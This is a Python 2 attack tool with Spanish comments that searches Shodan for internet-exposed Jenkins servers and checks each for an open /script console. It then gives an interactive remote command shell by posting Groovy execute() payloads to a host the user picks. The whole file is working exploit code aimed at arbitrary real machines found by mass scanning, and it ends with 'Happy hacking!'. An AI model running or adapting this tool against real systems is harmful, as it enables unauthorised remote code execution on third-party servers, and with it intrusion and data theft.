#!/usr/bin/python

import shodan, requests, re, time, threading, sys

# Variables globales

vuln_ips = []
SHODAN_API_KEY = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" # INSERTA AQUI TU CLAVE API DE SHODAN

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def noIPV6(vector_array):

	formatted_vector = []

	pat = re.compile("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")

	for ip in vector_array:
		if pat.match(ip):
			formatted_vector.append(ip)

	return formatted_vector

def make_request(ip):

	url = 'http://' + str(ip) + ':8080/script'

	try:
		r = requests.get(url, verify=False, timeout=3)
		if r.status_code == 200:
			print bcolors.WARNING + "La URL " + url + " es vulnerable!!" + bcolors.ENDC
			vuln_ips.append(ip)
	except:
		pass

def attack_rce(ip):
	print bcolors.OKGREEN + "\n[*] Exito!"
	print "[*] Escribe " + bcolors.WARNING + "exit" + bcolors.OKGREEN + " para salir de la sesion interactiva\n" + bcolors.ENDC
	while True:
	        command = raw_input(bcolors.OKGREEN + " > " + bcolors.ENDC)
		print

		if command == 'exit' or command == 'quit':
			print bcolors.HEADER + "[" + bcolors.WARNING + "*" + bcolors.HEADER + "]" + bcolors.OKBLUE  + " Cerrando sesion..." + bcolors.ENDC
			time.sleep(1)
			return

	        dataExec = '"{cmd}".execute().text'.format(cmd = command)
	        url = 'http://{ip}:8080/script'.format(ip = ip)

		try:
	        	r = requests.post(url, data = {"script":dataExec, "Submit":"Run"})
		except:
			print bcolors.FAIL + "La sesion se ha caido. Volviendo al menu..." + bcolors.ENDC
			time.sleep(1)
			return

		if r.status_code != 200:
			print bcolors.OKGREEN + "La sesion no devuelve informacion. Volviendo al menu..." + bcolors.ENDC
			time.sleep(1)
			return

	        parsed_text = r.text.replace('\n', 'NEWLINE').replace('>', '\n')

	        for line in parsed_text.split('\n'):
	                if "Result:" in line:
	                        print ' '.join(line.split(": ")[1:]).split('</pre')[0].replace('NEWLINE', '\n')

def attack_menu(ips):

	while True:
		print
		for index in range(0, len(ips)):
			print bcolors.HEADER + "[" + bcolors.WARNING + "{0}".format(index) + bcolors.HEADER + "]" + bcolors.OKGREEN + " {0}".format(ips[index]) + bcolors.ENDC
		print bcolors.HEADER + "[" + bcolors.WARNING + "99" + bcolors.HEADER + "]" + bcolors.ENDC + " Exit\n"

		try:
			attack_index = int(raw_input(bcolors.HEADER + "[" + bcolors.WARNING + "?" + bcolors.HEADER+ "]" + bcolors.OKBLUE + " Introduce el indice de la maquina: " + bcolors.ENDC))
                except (TypeError, ValueError):
                        print bcolors.FAIL + "Indice no aceptado. Comprueba la entrada" + bcolors.ENDC
                        time.sleep(2)
                        continue


		if attack_index == 99:
			return
		else:
			try:
				print bcolors.OKBLUE + "Iniciando shell remota contra " + str(ips[attack_index]) + "..." + bcolors.ENDC
				time.sleep(1)
				attack_rce(ips[attack_index])
			except IndexError:
				print bcolors.FAIL + "El indice introducido no se encuentra disponible" + bcolors.ENDC
				time.sleep(2)
				continue

if __name__ == "__main__":

	# print bcolors.OKGREEN
	print bcolors.OKGREEN + "  __            _    _           "
	print "  \ \  ___ _ __| | _(_)_ __  ___ "
	print "   \ \/ _ \ '__| |/ / | '_ \/ __|"
	print "/\_/ /  __/ |  |   <| | | | \__ \ "
	print "\___/ \___|_|  |_|\_\_|_| |_|___/"
	print bcolors.HEADER + "     -----desarrollado por zodi4c" + bcolors.ENDC

	api = shodan.Shodan(SHODAN_API_KEY)

	try:
		results = api.search('x-jenkins 200 ok port:8080')
	except shodan.APIError, error:
    		print bcolors.FAIL + "\nError: {0}\n".format(error) + bcolors.ENDC
		sys.exit(0)

	ips = []
	formatted_vector = []

	for result in results['matches']:
		ips.append("{0}".format(result['ip_str']))

	print bcolors.OKBLUE + "\nEnumerando servidores Jenkins vulnerables...\n" + bcolors.ENDC
	time.sleep(1)
	formatted_vector = noIPV6(ips)

	threads = []

	for ip in formatted_vector:
		t = threading.Thread(target=make_request, args=(ip,))
		threads.append(t)

	for x in threads:
		x.start()

	for x in threads:
		x.join()

	print "\n" + bcolors.HEADER + "[" + bcolors.WARNING + "*" + bcolors.HEADER+ "]" + bcolors.OKBLUE + " Se han encontrado " + bcolors.WARNING  + str(len(vuln_ips)) + bcolors.OKBLUE + " IPs vulnerables." + bcolors.ENDC
	attack_conf = raw_input(bcolors.HEADER + "[" + bcolors.WARNING + "?" + bcolors.HEADER+ "]" + bcolors.OKBLUE + " Desea realizar un ataque RCE a alguna de ellas? (y/N): " + bcolors.ENDC)

	if attack_conf == 'y' or attack_conf == 'Y':
		attack_menu(vuln_ips)

	print bcolors.FAIL + bcolors.BOLD + "\nHappy hacking! " + bcolors.OKGREEN  + "=)\n" + bcolors.ENDC
